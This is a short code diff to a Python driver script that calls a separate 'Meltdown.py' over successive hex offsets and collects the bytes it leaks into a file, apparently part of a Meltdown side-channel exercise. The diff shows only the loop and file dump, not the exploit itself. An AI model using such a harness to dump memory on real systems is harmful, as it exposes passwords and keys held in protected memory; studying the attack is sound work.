@@ -10,15 +10,17 @@ def bytes_to_string(byte_data):
 
 i=1
 result=""
+total_memory=""
 while("Exception: Memory space" not in result):
     resultat = subprocess.run(['python3', 'Meltdown.py', str(hex(i))], capture_output=True, text=True)
     if resultat.stderr == "":
         result=resultat.stdout
-        print(bytes_to_string(result))
+        total_memory += ''.join(bytes_to_string(result))
         i += 1
     else: 
         test=resultat.stderr
         truc=test.strip().split("\n")
         result=truc[len(truc)-1]
 
-
+with open("test.txt", 'w') as fichier:
+        fichier.write(total_memory)
